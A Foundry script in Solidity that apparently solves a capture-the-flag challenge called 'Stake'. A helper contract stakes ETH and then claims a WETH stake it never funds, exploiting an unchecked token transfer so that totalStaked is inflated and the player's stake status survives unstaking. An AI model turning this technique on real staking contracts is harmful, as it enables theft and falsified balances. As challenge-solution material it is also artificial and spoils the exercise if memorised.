// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/Stake.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Staker {
    Stake stake = Stake(0x9F3B490Daeb2b4c5B9ee6e5500643D0512dF0424);

    function StakeETH(uint256 amount) external {
        stake.StakeETH{value: amount}();
    }

    function appove_and_StakeWETH(uint256 amount) external {
        ERC20(stake.WETH()).approve(address(stake), 1 ether);
        stake.StakeWETH(amount);
    }

    function Unstake(uint256 amount) external {
        stake.Unstake(amount);
    }

    receive() external payable {}
}

contract StakeSolution is Script {
    Stake stake = Stake(0x9F3B490Daeb2b4c5B9ee6e5500643D0512dF0424);
    address weth = stake.WETH();
    address player = 0xeDc3e3588a5F0bf61c9A6B4ad1e573942d729e16;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        stake.StakeETH{value: 0.0011 ether}();
        stake.Unstake(0.0011 ether);

        Staker staker = new Staker();
        payable(address(staker)).call{value: 0.0012 ether}("");
        staker.StakeETH(0.0012 ether);

        staker.appove_and_StakeWETH(0.0011 ether);

        console.log(address(stake).balance);
        console.log(stake.totalStaked());
        console.log(stake.Stakers(player));
        console.log(stake.UserStake(player));

        vm.stopBroadcast();
    }
}
